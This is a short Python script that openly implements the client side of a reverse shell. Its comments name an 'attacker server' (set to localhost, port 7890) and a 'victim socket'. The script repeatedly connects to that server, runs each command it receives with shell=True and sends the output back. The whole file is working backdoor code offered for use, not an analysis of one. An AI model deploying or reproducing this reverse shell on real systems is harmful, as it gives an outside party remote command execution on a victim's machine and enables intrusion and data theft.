import subprocess
import socket
import time
from payload import Payload

# Attacker server ip and port
ip = "localhost"
port = 7890

# Create the victim socket that keep trying to connect to the server
def create_socket():
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect the socket to the server
    server_address = (ip, port)

    # Keep trying to connect to the server
    while True:
        try:
            sock.connect(server_address)
            print("Connected!")
            break
        except:
            print("Trying to connect to server ...")
            time.sleep(1)

    while True:
        # Receive data from the server
        data = sock.recv(1024)
        print('Received:'.center(40, "="))
        print(str(data.decode()))

        # Generate command
        stdout, stderr = run_command(data.decode())
        payload = Payload(stdout=stdout, stderr=stderr)
        packet = payload.get_packet()

        try:
            sock.sendall(packet)
        except:
            create_socket()


# Run a line of shell command and returns the result
# Todo: Keep one subprocess alive
def run_command(cmd):
    call = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = str(call.stdout.decode("utf-8")), str(call.stderr.decode("utf-8"))
    print(result)
    return str(call.stdout.decode("utf-8")), str(call.stderr.decode("utf-8"))


def main():
    create_socket()


if __name__ == '__main__':
    main()
